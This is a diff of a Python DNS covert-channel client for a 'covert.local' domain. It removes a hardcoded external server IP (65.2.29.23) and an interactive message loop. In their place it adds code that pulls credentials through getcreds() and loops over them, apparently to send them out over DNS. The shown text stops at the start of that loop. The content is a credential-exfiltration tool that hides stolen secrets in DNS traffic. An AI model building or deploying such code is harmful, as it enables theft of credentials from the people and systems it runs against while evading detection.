@@ -11,7 +11,7 @@ import sys
 from creds import getcreds
 
 class DNSClient:
-    def __init__(self, server_ip='65.2.29.23', server_port=5353, domain='covert.local'):
+    def __init__(self, server_ip, server_port, domain):
         """
         Initialize DNS client
         
@@ -230,7 +230,7 @@ def main():
     print("=" * 70)
     print()
 
-    server_ip = "65.2.29.23"
+    server_ip = "127.0.0.1"
     server_port = 5353
     domain = "covert.local"
     client = DNSClient(server_ip=server_ip, server_port=server_port, domain=domain)
@@ -256,24 +256,6 @@ def main():
     print("Ready to send messages. Type 'quit' to exit.")
     print("=" * 70)
     
-    # try:
-    #     while True:
-    #         message = input("\nEnter message: ").strip()
-            
-    #         if message.lower() == 'quit':
-    #             break
-            
-    #         if not message:
-    #             continue
-            
-    #         client.send_message(message)
-    #         time.sleep(0.5)  # Small delay between messages
-            
-    # except KeyboardInterrupt:
-    #     print("\n\n[*] Interrupted by user")
-    # finally:
-    #     client.close()
-    #     print("[*] Client closed")
     creds = getcreds()
     
     for i in creds:
